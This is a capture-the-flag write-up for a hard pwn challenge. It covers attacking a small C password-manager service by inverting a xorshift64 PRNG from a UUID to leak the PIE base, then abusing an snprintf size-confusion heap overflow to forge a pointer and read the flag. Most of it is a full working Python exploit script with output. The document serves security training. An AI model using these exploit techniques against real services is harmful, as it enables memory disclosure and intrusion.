---
title: "Backdoor"
ctf: "ICO 2026"
task: "VaultLock"
date: 2026-06-30
category: pwn
difficulty: hard
points: 40
flag_format: "ICO{...}"
author: "jt314"
---

> ℹ️ Read the [contest README](../../README.md) first — some challenge names, categories, and mappings are inferred.

# Backdoor (VaultLock db backdoor)

## Summary

`dist/db/db.c` is a small in-memory "password manager" service reachable
on port 8080. It reads `/flag.txt` into a global buffer at startup but
never exposes it through any menu command. Chaining a weak-PRNG address
leak with a heap `snprintf` size-confusion bug gives a pure network
read-what-where primitive, which is used to dereference `&flag` and print
it back over the socket.

## Solution

### Step 1: Leak the PIE base via the UUID generator

`gen_uuid()` seeds a xorshift64 PRNG once, lazily, with:

```c
xorshift_state = (uint64_t)time(NULL) ^ (uint64_t)(uintptr_t)&xorshift_state;
```

xorshift64 is a linear, invertible bit-mixing function. The very first
UUID the server ever returns encodes two consecutive xorshift64 outputs
(with 6 bits lost to UUID version/variant formatting, brute-forced
trivially — 16 candidates). Inverting those outputs recovers the exact
seed, and brute-forcing the tiny plausible range of `time(NULL)` (a few
minutes) solves for `&xorshift_state` — which is just `PIE_base + 0x5288`
(a fixed link-time offset, read via `nm build/db`). This gives the exact
PIE load address of the remote process, entirely from the network.

### Step 2: Heap overflow -> forge a pointer at `&flag`

`save_password()` sets `Password.password_size = strlen(password)`.
`modify_password()` does:

```c
snprintf(slot->password, slot->password_size - 1, "%s", new_password);
slot->password_size = new_password_size;   // = snprintf's return value
```

Calling it once with a 0-sized write (`password_size - 1 == 0`) writes
nothing but still returns `strlen(new_password)`, which gets stored back
as the *believed* buffer size — even though the real `malloc`'d buffer is
still tiny. The next call then overflows straight past that buffer into
the next sequentially-allocated `Password` struct on the heap, letting us
overwrite its `password` pointer field with an address of our choosing.
`get_passwords()` later does `printf("%s", slot->password)`, dereferencing
whatever we forged there.

Combining both bugs: compute `&flag = PIE_base + 0x5160`, forge the
neighboring struct's `password` pointer at that address, then read it
back.

```python
#!/usr/bin/env python3
import sys, time, struct, socket

MASK = (1 << 64) - 1
XORSHIFT_STATE_OFF = 0x5288   # nm build/db | grep xorshift_state
FLAG_OFF = 0x5160             # nm build/db | grep ' flag$'
OVERFLOW_TO_PW_PTR = 0x190    # id[37]+user_id[37]+name[0x120] padded + next chunk header

def xorshift64(x):
    x ^= (x << 13) & MASK; x ^= (x >> 7); x ^= (x << 17) & MASK
    return x & MASK

def _undo_shl(y, k):
    x = y
    for _ in range(70 // k + 2): x = (y ^ ((x << k) & MASK)) & MASK
    return x

def _undo_shr(y, k):
    x = y
    for _ in range(70 // k + 2): x = (y ^ (x >> k)) & MASK
    return x

def inv_xorshift64(y):
    return _undo_shl(_undo_shr(_undo_shl(y, 17), 7), 13)

class DB:
    def __init__(self, host, port, timeout=8):
        self.host, self.port, self.timeout = host, port, timeout
    def _conn(self):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self._read(s, b'choice > '); return s
    def _read(self, s, marker, cap=1<<20):
        buf = b''
        s.settimeout(self.timeout)
        while marker not in buf:
            c = s.recv(4096)
            if not c or len(buf) > cap: break
            buf += c
        return buf
    def _cmd(self, choice, steps):
        s = self._conn(); s.sendall((str(choice) + '\n').encode())
        for prompt, val in steps:
            self._read(s, prompt); s.sendall((val + '\n').encode() if isinstance(val, str) else val + b'\n')
        out = self._read(s, b'choice > '); s.close(); return out
    def insert_user(self, u, pk): return self._cmd(1, [(b'username   : ', u), (b'public_key : ', pk)])
    def get_user(self, u): return self._cmd(2, [(b'username : ', u)])
    def save_password(self, u, n, p): return self._cmd(3, [(b'username  : ', u), (b'name     : ', n), (b'password : ', p)])
    def get_passwords(self, u): return self._cmd(4, [(b'username : ', u)])
    def modify_password(self, u, n, p): return self._cmd(7, [(b'username  : ', u), (b'name     : ', n), (b'password : ', p)])

def recover_a_candidates(uuid_text):
    b = bytes.fromhex(uuid_text.replace('-', ''))
    a_obs = int.from_bytes(b[0:8], 'little'); b_obs = int.from_bytes(b[8:16], 'little')
    a_mask = ~(0xF << 52) & MASK; b_mask = ~(0b11 << 6) & MASK
    a_known = a_obs & a_mask; b_known = b_obs & b_mask
    return [a_known | (n << 52) for n in range(16)
            if (xorshift64(a_known | (n << 52)) & b_mask) == b_known]

def find_pie_bases(uuid_text, t_low, t_high):
    bases = set()
    for a in recover_a_candidates(uuid_text):
        seed = inv_xorshift64(a)
        for t in range(t_low, t_high + 1):
            base = (seed ^ t) - XORSHIFT_STATE_OFF & MASK
            if base & 0xFFF: continue
            if 0x555555554000 - 0x200000000000 <= base <= 0x7f0000000000:
                bases.add(base)
    return sorted(bases)

def exploit(host, port, window=180):
    db = DB(host, port)
    user = 'x' + str(int(time.time()))[-6:]
    t0 = int(time.time())
    assert b'OK' in db.insert_user(user, 'pk')
    uuid_text = db.get_user(user).decode().split('ID=')[1].split(' ')[0]
    t1 = int(time.time())

    for base in find_pie_bases(uuid_text, t0 - window, t1 + window):
        addr = struct.pack('<Q', base + FLAG_OFF)
        if addr[6] or addr[7] or b'\x00' in addr[:6]:
            continue
        assert b'OK' in db.save_password(user, 'A', 'X')            # password_size = 1
        assert b'OK' in db.save_password(user, 'B', 'placeholder')  # next struct on heap
        assert b'OK' in db.modify_password(user, 'A', 'A' * 4000)   # inflate believed size
        assert b'OK' in db.modify_password(user, 'A', b'A' * OVERFLOW_TO_PW_PTR + addr[:6])  # overflow -> forge ptr
        assert b'OK' in db.modify_password(user, 'A', b'A' * 69 + uuid_text.encode())        # repair user_id (short write)
        for line in db.get_passwords(user).split(b'\n'):
            if line.startswith(b'[1]') and b'password=' in line:
                pw = line.split(b'password=', 1)[1].rsplit(b' size=', 1)[0]
                if pw:
                    return pw.decode(errors='replace')
    raise RuntimeError('no candidate worked; retry against a freshly started db process')

if __name__ == '__main__':
    print(exploit(sys.argv[1], int(sys.argv[2])))
```

```
$ python3 exploit_flag3.py 127.0.0.1 8080
ICO{example_flag3}
```

**Note:** the seed is only recoverable from the *first* connection to a
freshly (re)started `db` process (the PRNG seeds lazily, once). Against a
long-running remote instance, run it as the very first connection.

## Flag

```
ICO{example_flag3}
```
